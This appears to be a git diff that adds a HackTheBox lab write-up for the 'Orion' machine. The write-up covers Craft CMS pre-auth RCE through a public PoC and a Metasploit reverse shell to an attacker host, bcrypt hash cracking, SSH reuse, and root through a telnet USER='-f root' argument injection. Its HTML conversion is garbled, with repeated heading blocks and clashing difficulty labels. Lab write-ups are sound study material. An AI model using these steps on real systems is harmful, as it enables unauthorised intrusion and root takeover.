@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Orion • HTB Writeup</title>
+    <title>Orion — HackTheBox Writeup • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,66 +17,353 @@
             padding: 2rem;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             width: 100%;
             background: rgba(12, 16, 28, 0.9);
             border: 1px solid rgba(0, 255, 200, 0.15);
             border-radius: 2rem;
             padding: 3rem;
-            text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
         h1 {
             font-size: 2.5rem;
             color: #6fffe0;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
             border-radius: 1rem;
+            margin-bottom: 2rem;
         }
-        .status i {
-            color: #ffcc00;
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        
+        .cve-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            color: #ff6666;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
             margin-right: 0.5rem;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
+        .highlight {
+            background: rgba(0, 255, 200, 0.05);
+            border: 1px solid rgba(0, 255, 200, 0.1);
+            border-radius: 0.5rem;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+        }
+        .attack-chain {
+            background: rgba(0, 255, 200, 0.02);
+            border: 1px solid rgba(0, 255, 200, 0.1);
             border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
             color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
+            line-height: 1.8;
+            overflow-x: auto;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Orion</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+
+<div class="container">
+    
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Orion</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 80</span>
+        <span><strong>OS:</strong> Linux</span>
     </div>
+Orion — HackTheBox Writeup</h1>
+
+<p><strong>Platform:</strong> HackTheBox  </p>
+<p><strong>Difficulty:</strong> Easy  </p>
+<p><strong>OS:</strong> Linux  </p>
+<p><strong>IP:</strong> <code>$TARGET</code>  </p>
+<p><strong>Domain:</strong> <code>orion.htb</code>  </p>
+<p><strong>Tech Stack:</strong> nginx, Craft CMS 5.6.16, MySQL, GNU inetutils telnet</p>
+
+<hr />
+
+<div class="attack-chain"><pre>## Attack Chain Overview
+
+```</pre></div>
+<p>Craft CMS 5.6.16 unauthenticated RCE (CVE-2025-32432)</p>
+<p>   → DB credentials + reverse shell as www-data</p>
+<p>   → MySQL user table → bcrypt hash → hashcat → adam:darkangel</p>
+<p>   → SSH as adam</p>
+<p>   → ss -tulpn reveals telnet on 127.0.0.1:23</p>
+<p>   → GNU inetutils telnet CVE-2026-24061 (USER env var)</p>
+<p>   → root</p>
+<pre><code>
+---
+
+## Table of Contents
+
+1. [Reconnaissance](#1-reconnaissance)
+2. [Web Fuzzing](#2-web-fuzzing)
+3. [Craft CMS RCE — CVE-2025-32432](#3-craft-cms-rce--cve-2025-32432)
+4. [Shell Stabilization](#4-shell-stabilization)
+5. [Linux Enumeration and Hash Extraction](#5-linux-enumeration-and-hash-extraction)
+6. [Hash Cracking](#6-hash-cracking)
+7. [Lateral Movement — SSH as adam](#7-lateral-movement--ssh-as-adam)
+8. [Privilege Escalation — Telnet CVE-2026-24061](#8-privilege-escalation--telnet-cve-2026-24061)
+9. [Root Flag](#9-root-flag)
+10. [Key Takeaways](#10-key-takeaways)
+
+---
+
+## 1. Reconnaissance
+</code></pre>
+<p>nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent</p>
+<p>nmap -sVC -p22,80 $TARGET -oN service</p>
+<pre><code>
+**Output:**</code></pre>
+<p>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)</p>
+<table>
+  <tr>
+    <th>ssh-hostkey:</th>
+  </tr>
+  <tr>
+    <td>_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</td>
+  </tr>
+</table>
+<p>80/tcp open  http    nginx 1.18.0 (Ubuntu)</p>
+<table>
+  <tr>
+    <th>_http-server-header: nginx/1.18.0 (Ubuntu)</th>
+  </tr>
+</table>
+<p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<pre><code>
+The HTTP redirect reveals the vhost. Add it to `/etc/hosts`:
+</code></pre>
+<p>echo "$TARGET orion.htb" | sudo tee -a /etc/hosts</p>
+<pre><code>
+Related notes: [nmap](../../../tools/recon/nmap.md), [silent-scan](../../../tools/recon/silent-scan.md)
+
+---
+
+## 2. Web Fuzzing
+</code></pre>
+<p>gobuster dir -u http://orion.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt</p>
+<pre><code>
+**Output:**</code></pre>
+<p>index                (Status: 200) [Size: 12272]</p>
+<p>admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]</p>
+<p>assets               (Status: 301) [Size: 178] [--> http://orion.htb/assets/]</p>
+<p>logout               (Status: 302) [Size: 0] [--> http://orion.htb/]</p>
+<p>p1                   (Status: 200) [Size: 12272]</p>
+<pre><code>
+The `/admin` panel and the `/api` endpoint (which leaks the framework version) were immediately interesting:
+</code></pre>
+<p>http://orion.htb/api → nginx/1.18.0 Yii Framework/2.0.51</p>
+<p>http://orion.htb/admin/login → Craft CMS 5.6.16</p>
+<pre><code>
+Related notes: [gobuster](../../../tools/fuzz/gobuster.md)
+
+---
+
+## 3. Craft CMS RCE — CVE-2025-32432
+
+Craft CMS 5.6.16 is vulnerable to **unauthenticated pre-auth RCE** via CVE-2025-32432. Confirmed with the check script:
+</code></pre>
+<p>git clone https://github.com/CTY-Research-1/CVE-2025-32432-PoC</p>
+<p>cd CVE-2025-32432-PoC</p>
+<p>chmod +x *.py</p>
+<p>python3 craftcms_rce_php_check.py -u http://orion.htb</p>
+<pre><code>
+**Output:**</code></pre>
+<p>Total URLs scanned: 1</p>
+<p>Vulnerable sites: 1</p>
+<p>Detailed results saved to vulnerable.txt</p>
+<pre><code>
+Triggered RCE to dump environment and config values:
+</code></pre>
+<p>python3 craftcms_final_payload.py -u http://orion.htb -c "id"</p>
+<p>cat exploit_response_*.html</p>
+<pre><code>
+**Output:**</code></pre>
+<p>CRAFT_DB_USER = root</p>
+<p>CRAFT_DB_PASSWORD = SuperSecureCraft123Pass!</p>
+<p>CRAFT_DB_DATABASE = orion</p>
+<p>Security Key = RRS86F6i2JQKdC6kfEI7frVxA47WVMx8</p>
+<pre><code>
+The Python PoC had reliability issues for an interactive shell. Switched to the Metasploit module for a stable meterpreter:
+</code></pre>
+<p>msfconsole -q</p>
+<p>use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432</p>
+<p>set rhosts orion.htb</p>
+<p>set rport 80</p>
+<p>set lhost <ATTACKER_IP></p>
+<p>exploit</p>
+<pre><code>
+Full technique: [craftcms-rce-cve-2025-32432](../../../exploits/web-rce/craftcms-rce-cve-2025-32432.md)
+
+---
+
+## 4. Shell Stabilization
+
+From the meterpreter session, drop to a proper shell and stabilize:
+</code></pre>
+<p>shell</p>
+<p>python3 -c 'import pty; pty.spawn("/bin/bash")'</p>
+<p>export TERM=xterm-256color</p>
+<p>reset</p>
+<pre><code>
+---
+
+## 5. Linux Enumeration and Hash Extraction
+</code></pre>
+<p>cat /etc/passwd | grep bash</p>
+<pre><code>
+**Output:**</code></pre>
+<p>root:x:0:0:root:/root:/bin/bash</p>
+<p>adam:x:1000:1000::/home/adam:/bin/bash</p>
+<pre><code>
+The DB credentials were already recovered from the RCE output. Queried the database directly for user hashes:
+</code></pre>
+<p>mysql -u root -p'SuperSecureCraft123Pass!' -D orion</p>
+<p>show tables;</p>
+<p>select * from users;</p>
+<pre><code>
+**Output:**</code></pre>
+<p>adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</p>
+<pre><code>
+Related notes: [mysql](../../../tools/database/mysql.md)
+
+---
+
+## 6. Hash Cracking
+
+Saved the bcrypt hash and cracked it (mode 3200):
+</code></pre>
+<p>echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt</p>
+<p>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -O</p>
+<p>hashcat -m 3200 hash.txt --show</p>
+<pre><code>
+**Output:**</code></pre>
+<p>$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel</p>
+<pre><code>
+Related notes: [hashcat](../../../tools/creds/hashcat.md)
+
+---
+
+## 7. Lateral Movement — SSH as adam
+</code></pre>
+<p>ssh adam@$TARGET</p>
+<h1>Orion — HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Orion</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 80</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+password: darkangel</h1>
+<p>cat /home/adam/user.txt</p>
+<pre><code>
+**User flag captured.**
+
+---
+
+## 8. Privilege Escalation — Telnet CVE-2026-24061
+
+### Enumeration
+</code></pre>
+<p>sudo -l</p>
+<p>find / -perm -4000 -type f 2>/dev/null</p>
+<p>ss -tulpn</p>
+<pre><code>
+`ss -tulpn` revealed an internal-only listener on port 23:
+</code></pre>
+<p>tcp  LISTEN  0  10  127.0.0.1:23  0.0.0.0:*</p>
+<pre><code>
+Port 23 is telnet. Confirmed the version:
+</code></pre>
+<p>telnet --version</p>
+<h1>Orion — HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Orion</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 80</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+telnet (GNU inetutils) 2.7</h1>
+<pre><code>
+### Exploitation — CVE-2026-24061
+
+GNU inetutils telnet 2.7 is vulnerable to **CVE-2026-24061**: the telnet client passes the `USER` environment variable to the server's login process without sanitization. Setting `USER` to `-f root` causes the login daemon to authenticate as root without a password (equivalent to `login -f root`).
+</code></pre>
+<p>env USER='-f root' telnet -a 127.0.0.1 23</p>
+<p>id</p>
+<h1>Orion — HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Orion</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 80</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+uid=0(root) gid=0(root) groups=0(root)</h1>
+<pre><code>
+The `-a` flag tells telnet to send the `USER` variable automatically. The combination with `-f root` tells the server-side login to skip authentication and use root.
+
+Full technique: [telnet-user-env-privesc-cve-2026-24061](../../../exploits/network-services/telnet-user-env-privesc-cve-2026-24061.md)
+
+---
+
+## 9. Root Flag
+</code></pre>
+<p>cat /root/root.txt</p>
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
+
 </body>
 </html>
